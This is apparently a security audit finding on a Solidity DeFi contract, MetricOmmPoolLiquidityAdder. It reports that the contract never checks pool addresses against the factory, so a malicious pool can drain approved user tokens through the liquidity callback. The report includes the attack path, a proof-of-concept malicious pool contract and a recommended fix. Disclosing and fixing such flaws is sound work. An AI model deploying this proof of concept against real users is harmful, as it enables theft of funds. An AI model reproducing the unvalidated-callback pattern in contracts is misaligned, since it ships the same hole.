### Title
Missing Factory Validation in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens via Callback — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts any caller-supplied `pool` address without verifying it against the factory registry. A malicious pool contract can exploit the `metricOmmModifyLiquidityCallback` to pull up to `maxAmountToken0` / `maxAmountToken1` of approved tokens directly from the user's wallet.

---

### Finding Description

`MetricOmmSimpleRouter` enforces factory membership on every pool before storing it as the expected callback caller: [1](#0-0) 

```solidity
function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
}
```

`MetricOmmPoolLiquidityAdder` has no equivalent check. The contract's own NatSpec acknowledges this: [2](#0-1) 

```
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

The attack path through `addLiquidityExactShares`:

1. `_addLiquidity` calls `_setPayContext(pool, payer, maxAmountToken0, maxAmountToken1)`, storing the unverified pool address as the sole authorized callback caller. [3](#0-2) 

2. `metricOmmModifyLiquidityCallback` accepts the call because `msg.sender == expectedPool` (the malicious pool passes this check). [4](#0-3) 

3. The callback then calls `IMetricOmmPool(msg.sender).getImmutables()` — querying the **malicious pool** for token addresses. [5](#0-4) 

4. `pay(token0, payer, msg.sender, amount0Delta)` and `pay(token1, payer, msg.sender, amount1Delta)` execute `safeTransferFrom(user, maliciousPool, amount)` for whatever tokens the malicious pool declared. [6](#0-5) 

The same path is reachable through `addLiquidityWeighted`: the probe phase calls the malicious pool, which reverts with a crafted `LiquidityProbe(need0, need1)` to manipulate share scaling, and the subsequent pay phase executes the token drain. [7](#0-6) 

---

### Impact Explanation

Any user who has approved `MetricOmmPoolLiquidityAdder` for token spending and is induced (via phishing, compromised front-end, or malicious integrator) to call `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address loses up to `maxAmountToken0` + `maxAmountToken1` of their approved tokens in a single transaction. The malicious pool controls which token addresses are returned from `getImmutables()`, so it can target any token the user has approved to the adder.

---

### Likelihood Explanation

No privileged role is required. The attacker only needs to:
- Deploy a contract implementing `IMetricOmmPoolActions` and `IMetricOmmPool`.
- Induce a user to call the adder with that address (compromised front-end, misleading UI, or malicious wrapper contract).

Users who interact with the adder through any intermediary that controls the `pool` parameter are fully exposed. The `MetricOmmSimpleRouter` provides the correct guard; the absence of the same guard in `MetricOmmPoolLiquidityAdder` is an inconsistency that creates a reachable exploit path for any unprivileged actor.

---

### Recommendation

Add factory verification in `MetricOmmPoolLiquidityAdder` before storing the pool in transient context, mirroring `MetricOmmSwapRouterBase._requireFactoryPool`:

```solidity
function _addLiquidity(address pool, ...) internal returns (...) {
+   if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    ...
}
```

This requires injecting the factory address into `MetricOmmPoolLiquidityAdder` (currently absent) and applying the check in `_addLiquidity` and the probe branch of `addLiquidityWeighted`.

---

### Proof of Concept

```solidity
// Attacker deploys:
contract MaliciousPool {
    address token0; address token1;
    constructor(address _t0, address _t1) { token0 = _t0; token1 = _t1; }

    // IMetricOmmPool
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0; imm.token1 = token1;
    }

    // IMetricOmmPoolActions
    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Call back with KIND_PAY and max amounts
        IMetricOmmPoolLiquidityAdder(msg.sender)
            .metricOmmModifyLiquidityCallback(
                MAX0, MAX1, abi.encode(uint8(1)) // KIND_PAY = 1
            );
        return (MAX0, MAX1);
    }
}

// Victim (or front-end on victim's behalf) calls:
adder.addLiquidityExactShares(
    address(maliciousPool),
    victim,
    0,
    deltas,
    MAX0,   // maxAmountToken0
    MAX1,   // maxAmountToken1
    ""
);
// Result: victim loses MAX0 of token0 and MAX1 of token1 to maliciousPool
```

The callback check `msg.sender == expectedPool` passes because `expectedPool` was set to `maliciousPool` by `_setPayContext`. The token addresses come from `maliciousPool.getImmutables()`, so the attacker chooses which approved tokens are drained.

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L82-85)
```text
  function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L106-115)
```text
    try IMetricOmmPoolActions(pool)
      .addLiquidity(owner, salt, weightDeltas, abi.encode(KIND_PROBE), extensionData) returns (
      uint256, uint256
    ) {
      revert WeightedProbeInconclusive();
    } catch (bytes memory reason) {
      (uint256 need0, uint256 need1) = _decodeLiquidityProbeOrBubble(reason);
      LiquidityDelta memory scaled = _scaleWeightsToShares(weightDeltas, maxAmountToken0, maxAmountToken1, need0, need1);
      return _addLiquidity(pool, owner, salt, scaled, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-164)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-171)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L172-177)
```text
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L193-196)
```text
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```
